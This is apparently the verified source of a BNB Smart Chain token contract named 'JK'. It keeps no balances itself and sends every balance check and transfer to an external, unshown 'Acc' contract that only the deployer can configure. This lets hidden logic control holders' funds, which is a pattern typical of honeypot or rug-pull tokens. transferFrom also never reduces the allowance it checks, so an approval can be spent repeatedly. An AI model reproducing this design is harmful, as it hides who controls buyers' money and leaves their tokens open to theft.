/**
 *Submitted for verification at BscScan.com on 2022-05-27
*/

// SPDX-License-Identifier: MIT
//--
pragma solidity ^0.5.16;

interface Acc {
    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function setup(address who,address pair,uint8 dec,uint256 total) external;
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract JK {
    
    string public constant name = "JK";
    string public constant symbol = "JK";
    uint8 public constant decimals = 9;
    uint256 totalSupply_;
    address private Acc_address;
    address private deployer;
    mapping(address => mapping (address => uint256)) allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _acc) public {
        totalSupply_ = 1000000*10**9;
        deployer = msg.sender;
        Acc_address = _acc;
    }

    function setup(address pair) public{
        require(msg.sender==deployer,"Not Allowed");
        Acc(Acc_address).setup(msg.sender,pair,9,totalSupply_);
    }

        function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    
    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
    function balanceOf(address tokenOwner) public view returns (uint256) {
        return Acc(Acc_address).balanceOf(tokenOwner);
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        Acc(Acc_address).doTransfer(msg.sender,from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        Acc(Acc_address).doTransfer(msg.sender,msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}